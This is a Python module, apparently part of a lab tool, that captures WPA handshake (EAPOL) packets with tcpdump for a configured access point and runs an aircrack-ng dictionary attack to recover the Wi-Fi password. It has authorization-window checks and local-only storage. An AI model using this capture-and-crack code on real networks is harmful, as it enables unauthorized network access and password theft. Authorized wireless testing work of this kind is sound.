"""Bounded, explicitly scoped office-lab operations. Evidence stays local."""

import os
import json
from pathlib import Path
import re
import signal
import subprocess
import time
import uuid

from .exploration import MAC
from .radio import command


def authorized_target(config, now=None, minimum_seconds=0):
    now = time.time() if now is None else now
    target = config.get("lab", {})
    address = str(target.get("bssid", "")).upper()
    expires = int(target.get("authorized_until", 0))
    if (not MAC.fullmatch(address) or int(address[:2], 16) & 1
            or address == "00:00:00:00:00:00"):
        raise RuntimeError("Cadastre o BSSID do laboratorio no config.json")
    if not now < expires <= now + 86400 or expires - now < minimum_seconds:
        raise RuntimeError("Autorizacao do lab: minimo 45s restantes, max. 24h")
    return address


def capture(config, data_dir):
    address = authorized_target(config, minimum_seconds=45)
    interface = str(config.get("lab", {}).get("monitor_interface", ""))
    if not re.fullmatch(r"[A-Za-z0-9_.-]{1,32}", interface):
        raise RuntimeError("Defina monitor_interface do laboratorio")
    info = command(["iw", "dev", interface, "info"], timeout=3)
    if not re.search(r"\btype monitor\b", info):
        raise RuntimeError("A interface do lab precisa estar em modo monitor")
    root = Path(data_dir) / "lab"
    root.mkdir(parents=True, exist_ok=True)
    path = root / ("capture-" + uuid.uuid4().hex + ".pcap")
    packet_filter = ("(wlan addr1 %s or wlan addr2 %s or wlan addr3 %s) "
                     "and ether proto 0x888e" % (address, address, address))
    # Create exclusively with private permissions before passing the path to tcpdump.
    descriptor = os.open(str(path), os.O_WRONLY | os.O_CREAT | os.O_EXCL, 0o600)
    os.close(descriptor)
    args = ["tcpdump", "-Z", "root", "-i", interface, "-U", "-s", "512", "-c", "80", "-w", str(path),
            packet_filter]
    try:
        with subprocess.Popen(args, stdin=subprocess.DEVNULL, stdout=subprocess.DEVNULL,
                              stderr=subprocess.DEVNULL) as process:
            try:
                process.wait(timeout=20)
            except subprocess.TimeoutExpired:
                process.send_signal(signal.SIGINT)
                try:
                    process.wait(timeout=2)
                except subprocess.TimeoutExpired:
                    process.kill()
                    process.wait()
            if process.returncode not in (0, -signal.SIGINT):
                raise RuntimeError("tcpdump falhou; confira a interface do lab")
    except FileNotFoundError:
        raise RuntimeError("Dependencia ausente: tcpdump") from None
    authorized_target(config)
    if path.stat().st_size <= 24:
        raise RuntimeError("Nenhum EAPOL capturado; reconecte um cliente do lab")
    # The manifest binds evidence to the exact authorized target, not an SSID.
    manifest = path.with_suffix(".json")
    with manifest.open("x", encoding="utf-8") as handle:
        json.dump({"bssid": address, "created_at": int(time.time())}, handle)
    return dict(path=str(path), bssid=address,
                message="EAPOL salvo; handshake ainda nao validado")


def test_dictionary(config, data_dir):
    address = authorized_target(config, minimum_seconds=45)
    root = Path(data_dir) / "lab"
    candidates = []
    for manifest in root.glob("capture-*.json"):
        if manifest.is_symlink():
            continue
        metadata = json.loads(manifest.read_text(encoding="utf-8"))
        path = manifest.with_suffix(".pcap")
        if (metadata.get("bssid") == address and path.is_file() and not path.is_symlink()
                and 0 <= time.time() - int(metadata["created_at"]) <= 86400):
            candidates.append((metadata["created_at"], path))
    if not candidates:
        raise RuntimeError("Capture primeiro o alvo atual do laboratorio")
    path = max(candidates)[1]
    dictionary = root / "dictionary.txt"
    if not dictionary.is_file() or dictionary.is_symlink() or dictionary.stat().st_size > 256 * 1024:
        raise RuntimeError("Adicione lab/dictionary.txt (max. 256 KB)")
    key_path = path.with_suffix(".key")
    if key_path.exists():
        raise RuntimeError("Esta captura ja tem resultado local; faca nova captura")
    descriptor = os.open(str(key_path), os.O_WRONLY | os.O_CREAT | os.O_EXCL, 0o600)
    os.close(descriptor)
    args = ["aircrack-ng", "-a", "2", "-b", address, "-w", str(dictionary),
            "-l", str(key_path), str(path)]
    try:
        # Suppress output because aircrack may print the recovered secret.
        with subprocess.Popen(args, stdin=subprocess.DEVNULL, stdout=subprocess.DEVNULL,
                              stderr=subprocess.DEVNULL) as process:
            try:
                code = process.wait(timeout=30)
            except subprocess.TimeoutExpired:
                process.kill()
                process.wait()
                code = None
    except FileNotFoundError:
        key_path.unlink()
        raise RuntimeError("Dependencia ausente: aircrack-ng") from None
    authorized_target(config)
    if key_path.stat().st_size:
        return dict(found=True, reward_id=address,
                    message="Senha encontrada; resultado local em lab/*.key")
    key_path.unlink()
    return dict(found=False, reward_id=None,
                message=("Limite de 30s; teste inconclusivo" if code is None
                         else "Senha nao encontrada ou handshake insuficiente"))
